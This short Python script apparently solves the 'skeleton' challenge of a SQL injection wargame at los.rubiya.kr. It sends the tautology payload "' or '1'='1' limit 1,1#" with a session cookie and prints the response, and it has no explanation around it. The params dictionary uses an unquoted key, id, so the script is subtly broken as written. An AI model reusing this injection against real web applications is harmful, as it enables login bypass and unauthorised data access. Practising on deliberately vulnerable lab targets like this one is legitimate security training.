import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
params = { id: "' or '1'='1' limit 1,1#" }

r = requests.get(url, params=params, cookies=cookies)
print(r.text)